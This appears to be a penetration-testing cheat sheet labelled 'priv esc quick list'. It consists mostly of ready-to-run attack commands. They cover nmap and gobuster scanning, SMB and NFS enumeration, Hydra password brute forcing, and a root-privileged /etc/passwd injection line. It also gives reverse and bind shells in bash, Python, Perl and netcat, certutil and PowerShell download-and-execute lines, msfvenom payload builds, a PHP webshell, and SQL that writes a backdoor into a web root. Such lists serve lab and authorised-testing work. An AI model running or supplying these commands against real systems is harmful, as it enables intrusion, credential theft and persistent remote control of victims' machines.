priv esc quick list
==============================================================
# /etc/passwd line
```
c0:$1$coyote0x$S9Aruc4H1kvDizg..ij81.:0:0:root:/root:/bin/bash
```

                          Initial Fast TCP Scan                                 
================================================================================

```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
```

                               Full TCP Scan                            
========================================================================

```bash
nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
```

                           Limited Full TCP Scan                          
==========================================================================

If the syn scan is taking very long to complete, the following command is an alternative (no service detection).

```bash
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1
```

                            Top 100 UDP Scan                              
==========================================================================

```bash
nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
```

                           Full Vulnerability scan                                     
=======================================================================================

```bash
nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

                            Vulners Vulnerability Script                                           
===================================================================================================

```bash
nmap -v -sS  -Pn --script nmap-vulners $IP
```

                           SMB Vulnerabitlity Scan                                
==================================================================================

```bash
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 $IP
```

                             NBTSCAN                                          
==============================================================================

```bash
nmap -sV $IP --script nbstat.nse -v
```

# HTTP
## Gobuster
### Fast Scan (Small List)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20
```

### Fast Scan (Big List)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

### Slow Scan (Check File Extensions)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
```

## HTTPS

Set the --insecuressl flag.

# SMB
## SMBCLIENT

To fix NT_STATUS_CONNECTION_DISCONNECTED errors in new Kali installations add client min protocol = NT1 to your \etc\samba\smb.conf file.

### List Shares (As Guest)

```bash
smbclient -U guest -L 192.168.0.1
```

### Connect to A Share (As User John)

```bash
smbclient \\\\192.168.0.1\\Users -U c.smith
```

### Download All Files From A Directory Recursively

```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

example:
```bash
smbclient \\\\192.168.0.1\\Data -U John -c 'prompt OFF;recurse ON;cd '\Users\John\';lcd '/tmp/John';mget *'
```

### Alternate File Streams
List Streams

```bash
smbclient \\\\192.168.0.1\\Data -U John -c 'allinfo "\Users\John\file.txt"'
```

### Download Stream By Name (:SECRET)

```bash
smbclient \\\\192.168.0.1\\Data -U John

get "\Users\John\file.txt:SECRET:$DATA"
```

## Enum4Linux
Scan Host

```bash
enum4linux 192.168.0.1
```

### Scan Host, Suppress Errors

```bash
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out 
```

# NFS
## Show mountable drives

```bash
showmount -e 192.168.0.1
```

## Mount Drive

mkdir mpt
```bash
mount -t nfs -o soft 192.168.0.1:/backup mpt/
```

# WebApp Paths

https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md

# Brute Force
## Hydra
### HTTP Basic Authentication

```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15
```

### HTTP Get Request

```bash
hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

### HTTP Post Request

Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use https-post-form instead of http-post-form for HTTPS sites.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

### MYSQL

Change MYDATABASENAME. Default databasename is mysql.

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

# File Transfer
## Powershell
### As Cmd.exe Command

```bash
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

### Encode Command for Transfer

Very helpful for chars that need to be escaped otherwise.

```bash
$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded
```

## Certutil
### Download

```bash
certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
```

### Download & Execute Python Command

```bash
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
```

# SMB
## Start Impacket SMB Server (With SMB2 Support)

```bash
impacket-smbserver -smb2support server_name /var/www/html
```

## List Drives (Execute on Victim)

```
net view \\192.168.0.1
```

## Copy Files (Execute on Victim)

```
copy \\192.168.0.1\server_name\shell.exe shell.exe
```

## Netcat
### Receiving file

```bash
nc -l -p 1234 > out.file
```

### Sending file

```bash
nc -w 3 192.168.0.1 1234 < out.file
```

## TFTP
Start TFTP Daemon (Folder /var/tftp)

```bash
atftpd --daemon --port 69 /var/tftp
```

### Transfer Files

```bash
tftp -i 192.168.0.1 GET whoami.exe
```

# Shells
## Upgrade Your Shell (TTY Shell)

```
python -c 'import pty;pty.spawn("/bin/bash");' 
```

## Catching Reverse Shells (Netcat)

rlwrap enables the usage of arrow keys in your shell. https://github.com/hanslub42/rlwrap

```bash
rlwrap nc -nlvp 4444
```

Netcat
Reverse Shell
Unix

Victim:

```
nc 192.168.0.1 4444 -e /bin/bash
```

If -e is not allowed, try to find other versions of netcat

- /bin/nc
- /usr/bin/ncat
- /bin/netcat
- /bin/nc.traditional

Attacker:

```
rlwrap nc -nlvp 4444
```

Windows

```
nc 192.168.0.1 4444 -e cmd.exe
```

Bind shell
Unix

Victim:

```
nc -nlvp 4444 -e /bin/bash
```

Attacker:

```
nc 192.168.0.1 4444
```

Windows

Victim:

```
nc -nlvp 4444 -e cmd.exe
```

Attacker:

```
nc 192.168.0.1 4444
```

## Bash
## Reverse Shell

```
/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
```

## Python
## As Command (Reverse Shell)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Python Code (Reverse Shell)

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## PHP
Kali Default PHP Reverse Shell

```
cat /usr/share/webshells/php/php-reverse-shell.php
```

## Kali Default PHP CMD Shell

```bash
cat /usr/share/webshells/php/php-backdoor.php
```

## PHP Reverse Shell

## coyote PHP command shell
```
<?php system($_REQUEST[0]); ?>
```

## Call the CMD shell:

http://192.168.0.1/cmd_shell.php?cmd=whoami

WhiteWinterWolf Webshell

https://github.com/WhiteWinterWolf/wwwolf-php-webshell

# MSFVENOM
## Windows Binary (.exe)
## 32 Bit (x86)

## Reverse Shell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

## Bind Shell:

```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

## Output in Hex, C Style, Exclude bad chars, Exitfunction thread:

```bash
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

## 64 Bit (x64)

## Reverse Shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

## Bind Shell:

```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

## Meterpreter:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

## Linux Binary (.elf)
## 32 Bit (x86)

## Reverse Shell:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

## Bind Shell:

```bash
msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf
```

## 64 Bit (x64)

## Reverse Shell:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

## Bind Shell:

```bash
msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf
```

## Java Server Pages (.jsp)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
```

## As .war:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
```

## Active Sever Pages Extended (.aspx)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```

# Active Sever Pages Extended (.aspx)
## Transfer A File (Certutil)

```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

## Execute a File

```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

# Perl
## Reverse Shell

```
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PhpmyAdmin

Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)

## Windows:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

## Unix:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```


                      Directory Fuzzing                      
=============================================================
- `--hh` hide responses of length in chars

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hc 404  "$URL"
```

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hc 404 --hh 999  "$URL" 
```

```bash
dirb "$URL" /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt 
```

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  "$URL"
```

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404  "$URL"
```


                     Sub domain Enum                       
===========================================================

```bash
findomain -t "$URL" -q
```

```bash
subfinder -d "$URL"
```

                     URL CRAWL/ Discovery                     
==============================================================

```bash
echo "$URL" | waybackurls| httpx-pd -silent > link.txt
```

